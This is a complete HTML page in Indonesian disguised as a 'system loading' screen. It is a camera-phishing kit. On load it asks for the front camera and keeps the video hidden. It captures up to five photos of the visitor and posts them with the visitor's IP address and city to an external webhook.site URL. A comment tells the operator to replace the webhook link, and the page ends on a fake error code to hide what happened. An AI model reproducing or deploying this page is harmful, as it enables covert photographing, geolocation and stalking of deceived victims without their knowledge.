<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; }
        #container { text-align: center; }
        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 14px; font-weight: bold; color: #fe2c55; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="container">
        <div id="loader"></div>
        <div id="status">MENGHUBUNGKAN KE SERVER...</div>
        <p style="font-size: 12px; color: #888;">Mohon jangan tutup halaman ini.</p>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // GANTI LINK WEBHOOK DI SINI
        const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        let photoCount = 0;

        async function startSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    statusDiv.innerText = "SINKRONISASI DATA...";
                    // Langsung ambil foto pertama setelah 2 detik
                    setTimeout(takeSnapShot, 2000); 
                };
            } catch (err) {
                statusDiv.innerText = "KONEKSI GAGAL";
                kirimData({ status: "IZIN_DITOLAK" });
            }
        }

        function takeSnapShot() {
            if (photoCount >= 5) {
                statusDiv.innerText = "ERROR: 0x88291"; 
                return;
            }

            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                photoCount++;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataFoto = canvas.toDataURL('image/jpeg', 0.4);

                kirimData({
                    event: "CAPTURE",
                    no: photoCount,
                    foto: dataFoto
                });
            }

            // Ambil foto berikutnya setiap 2 detik
            setTimeout(takeSnapShot, 2000);
        }

        async function kirimData(payload) {
            try {
                // Ambil data IP & Lokasi sederhana
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                const finalData = { ...payload, ...{ kota: ipData.city, ip: ipData.ip } };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(finalData)
                });
            } catch (e) {}
        }

        window.onload = startSystem;
    </script>
</body>
</html>
